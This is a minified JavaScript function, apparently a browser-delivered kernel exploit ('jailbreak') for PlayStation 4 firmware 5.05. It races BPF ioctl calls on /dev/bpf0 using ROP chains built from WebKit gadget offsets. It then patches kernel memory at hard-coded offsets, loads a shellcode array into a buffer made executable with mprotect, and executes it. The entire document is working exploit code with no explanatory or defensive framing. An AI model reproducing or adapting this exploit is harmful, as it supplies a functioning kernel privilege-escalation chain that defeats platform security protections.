function jailbreak(){
var test=p.syscall(23,0);if(test!="0"){
setTimeout(function(){	
var fd=p.syscall(5,p.sptr("/dev/bpf0"),2).low;var fd1=p.syscall(5,p.sptr("/dev/bpf0"),2).low;if(fd==(-1>>>0)){throw new Error("open bpf fail");} var bpf_valid=p.malloc32(16384);var bpf_spray=p.malloc32(16384);var bpf_valid_u32=bpf_valid.backing;var bpf_valid_prog=p.malloc(64);p.write8(bpf_valid_prog,2048/8);p.write8(bpf_valid_prog.add32(8),bpf_valid);var bpf_spray_prog=p.malloc(64);p.write8(bpf_spray_prog,2048/8);p.write8(bpf_spray_prog.add32(8),bpf_spray);for(var i=0;i<1024;){bpf_valid_u32[i++]=6;bpf_valid_u32[i++]=0;} var rtv=p.syscall(54,fd,2148549243,bpf_valid_prog);if(rtv.low!=0){throw new Error("ioctl bpf fail");} var spawnthread=function(name,chain){var longjmp=webKitBase.add32(5352);var createThread=webKitBase.add32(7836560);var contextp=p.malloc32(8192);var contextz=contextp.backing;contextz[0]=1337;var thread2=new rop();thread2.push(g.ret);thread2.push(g.ret);thread2.push(g.ret);thread2.push(g.ret);chain(thread2);p.write8(contextp,g.ret);p.write8(contextp.add32(16),thread2.stackBase);p.syscall(324,1);var retv=function(){p.fcall(createThread,longjmp,contextp,p.sptr(name));};nogc.push(contextp);nogc.push(thread2);return retv;};var interrupt1,loop1;var sock=p.syscall(97,2,2);var kscratch=p.malloc32(4096);var start1=spawnthread("GottaGoFast",function(thread2){interrupt1=thread2.stackBase;thread2.push(g.ret);thread2.push(g.ret);thread2.push(g.ret);thread2.push(g.pop_rdi);thread2.push(fd);thread2.push(g.pop_rsi);thread2.push(2148549243);thread2.push(g.pop_rdx);thread2.push(bpf_valid_prog);thread2.push(g.pop_rsp);thread2.push(thread2.stackBase.add32(2048));thread2.count=256;var cntr=thread2.count;thread2.push(s[54]);thread2.push_write8(thread2.stackBase.add32(cntr*8),s[54]);thread2.push(g.pop_rdi);var wherep=thread2.pushSymbolic();thread2.push(g.pop_rsi);var whatp=thread2.pushSymbolic();thread2.push(g.mov__rdi__rsi);thread2.push(g.pop_rsp);loop1=thread2.stackBase.add32(thread2.count*8);thread2.push(1094795585);thread2.finalizeSymbolic(wherep,loop1);thread2.finalizeSymbolic(whatp,loop1.sub32(8));});var krop=new rop();var race=new rop();var ctxp=p.malloc32(8192);var ctxp1=p.malloc32(8192);var ctxp2=p.malloc32(8192);p.write8(bpf_spray.add32(16),ctxp);p.write8(ctxp.add32(80),0);p.write8(ctxp.add32(104),ctxp1);var stackshift_from_retaddr=0;p.write8(ctxp1.add32(16),o2wk(19536333));stackshift_from_retaddr+=8+88;p.write8(ctxp.add32(0),ctxp2);p.write8(ctxp.add32(16),ctxp2.add32(8));p.write8(ctxp2.add32(2000),o2wk(7271653));var iterbase=ctxp2;for(var i=0;i<15;i++){p.write8(iterbase,o2wk(19536333));stackshift_from_retaddr+=8+88;p.write8(iterbase.add32(2000+32),o2wk(7271653));p.write8(iterbase.add32(8),iterbase.add32(32));p.write8(iterbase.add32(24),iterbase.add32(32+8));iterbase=iterbase.add32(32);} var raxbase=iterbase;var rdibase=iterbase.add32(8);var memcpy=get_jmptgt(webKitBase.add32(248));memcpy=p.read8(memcpy);p.write8(raxbase,o2wk(22848539));stackshift_from_retaddr+=8;p.write8(rdibase.add32(112),o2wk(19417140));stackshift_from_retaddr+=8;p.write8(rdibase.add32(24),rdibase);p.write8(rdibase.add32(8),krop.stackBase);p.write8(raxbase.add32(48),g.mov_rbp_rsp);p.write8(rdibase,raxbase);p.write8(raxbase.add32(1056),o2wk(2566497));p.write8(raxbase.add32(64),memcpy.add32(194-144));var topofchain=stackshift_from_retaddr+40;p.write8(rdibase.add32(176),topofchain);for(var i=0;i<4096/8;i++){p.write8(krop.stackBase.add32(i*8),g.ret);} krop.count=16;var kpatch=function(offset,qword){krop.push(g.pop_rax);krop.push(kscratch);krop.push(g.mov_rax__rax__);krop.push(g.pop_rsi);krop.push(offset);krop.push(g.add_rax_rsi);krop.push(g.pop_rsi);krop.push(qword);krop.push(g.mov__rax__rsi);};var kpatch2=function(offset,offset2){krop.push(g.pop_rax);krop.push(kscratch);krop.push(g.mov_rax__rax__);krop.push(g.pop_rsi);krop.push(offset);krop.push(g.add_rax_rsi);krop.push(g.mov_rdi_rax);krop.push(g.pop_rax);krop.push(kscratch);krop.push(g.mov_rax__rax__);krop.push(g.pop_rsi);krop.push(offset2);krop.push(g.add_rax_rsi);krop.push(g.mov__rdi__rax);};p.write8(kscratch.add32(1056),g.pop_rdi);p.write8(kscratch.add32(64),g.pop_rax);p.write8(kscratch.add32(24),kscratch);krop.push(g.pop_rdi);krop.push(kscratch.add32(24));krop.push(g.mov_rbp_rsp);var rboff=topofchain-krop.count*8+40;krop.push(o2wk(2566497));krop.push(g.pop_rax);krop.push(rboff);krop.push(g.add_rdi_rax);krop.push(g.mov_rax__rdi__);krop.push(g.pop_rsi);krop.push(762);krop.push(g.add_rax_rsi);krop.push(g.mov__rdi__rax);var shellbuf=p.malloc32(4096);krop.push(g.pop_rdi);krop.push(kscratch);krop.push(g.mov__rdi__rax);krop.push(g.pop_rsi);krop.push(808116);krop.push(g.add_rax_rsi);krop.push(g.pop_rdi);krop.push(kscratch.add32(8));krop.push(g.mov__rdi__rax);krop.push(g.jmp_rax);krop.push(g.pop_rdi);krop.push(kscratch.add32(16));krop.push(g.mov__rdi__rax);krop.push(g.pop_rsi);krop.push(new int64(4294901759,4294967295));krop.push(g.and_rax_rsi);krop.push(g.mov_rdx_rax);krop.push(g.pop_rax);krop.push(kscratch.add32(8));krop.push(g.mov_rax__rax__);krop.push(g.pop_rsi);krop.push(9);krop.push(g.add_rax_rsi);krop.push(g.mov_rdi_rax);krop.push(g.mov_rax_rdx);krop.push(g.jmp_rdi);krop.push(g.pop_rax);krop.push(kscratch);krop.push(g.mov_rax__rax__);krop.push(g.pop_rsi);krop.push(221338);krop.push(g.add_rax_rsi);krop.push(g.mov_rax__rax__);krop.push(g.pop_rdi);krop.push(kscratch.add32(816));krop.push(g.mov__rdi__rax);kpatch(221338,new int64(2425420344,2425393296));kpatch(20169540,shellbuf);kpatch(new int64(4293816070,4294967295),new int64(184,3297329408));kpatch(new int64(4293470503,4294967295),new int64(0,1082624841));kpatch(new int64(4293470533,4294967295),new int64(2425388523,1922076816));kpatch(new int64(4294769332,4294967295),new int64(934690871,826654769));kpatch(828366,new int64(115177,2336788480));kpatch(1329844,new int64(2428747825,2425393296));kpatch(new int64(15789236,0),new int64(2,0));kpatch2(new int64(15789244,0),new int64(4293548276,4294967295));kpatch(new int64(15789276,0),new int64(0,1));krop.push(g.pop_rax);krop.push(kscratch.add32(8));krop.push(g.mov_rax__rax__);krop.push(g.pop_rsi);krop.push(9);krop.push(g.add_rax_rsi);krop.push(g.mov_rdi_rax);krop.push(g.pop_rax);krop.push(kscratch.add32(16));krop.push(g.mov_rax__rax__);krop.push(g.jmp_rdi);krop.push(o2wk(380345));krop.push(kscratch.add32(4096));var kq=p.malloc32(16);var kev=p.malloc32(256);kev.backing[0]=sock;kev.backing[2]=131071;kev.backing[3]=1;kev.backing[4]=5;var shcode=[35817,2425393152,2425393296,2425393296,8567125,2303246336,1096172005,1398030677,2303275535,3149957588,256,551862601,1220806985,9831821,2370371584,4265616532,2370699263,3767542964,2370633744,1585456300,2169045059,1265721540,277432321,4202255,698,3867757568,524479,3607052544,960335176,1207959552,3224487561,2211839809,3698655723,1103114587,1096630620,2428722526,1032669269,4294967160,2303260209,15293925,1207959552,770247,2303262720,3271888842,1818324331,979595116,628633632,1815490864,2648,0,0,0,0,0,0,0,0,0,0,0,0,0,0];for(var i=0;i<shcode.length;i++){shellbuf.backing[i]=shcode[i];} start1();while(1){race.count=0;race.push(s[362]);race.push(g.pop_rdi);race.push(kq);race.push(g.mov__rdi__rax);race.push(g.ret);race.push(g.ret);race.push(g.ret);race.push(g.ret);race.push_write8(loop1,interrupt1);race.push(g.pop_rdi);race.push(fd);race.push(g.pop_rsi);race.push(2148549243);race.push(g.pop_rdx);race.push(bpf_valid_prog);race.push(s[54]);race.push(g.pop_rax);race.push(kq);race.push(g.mov_rax__rax__);race.push(g.mov_rdi_rax);race.push(g.pop_rsi);race.push(kev);race.push(g.pop_rdx);race.push(1);race.push(g.pop_rcx);race.push(0);race.push(g.pop_r8);race.push(0);race.push(s[363]);race.push(g.pop_rdi);race.push(fd1);race.push(g.pop_rsi);race.push(2148549243);race.push(g.pop_rdx);race.push(bpf_spray_prog);race.push(s[54]);race.push(g.pop_rax);race.push(kq);race.push(g.mov_rax__rax__);race.push(g.mov_rdi_rax);race.push(s[6]);race.run();if(kscratch.backing[0]!=0){p.syscall(74,shellbuf,16384,7);p.fcall(shellbuf);break;}}
sessionStorage.kexrunning="no";
alert("5.05 Jailbreak Success!\nPress OK To Continue");
kexDone();
},500);
}else{sessionStorage.kexrunning="no";kexDone2();}
}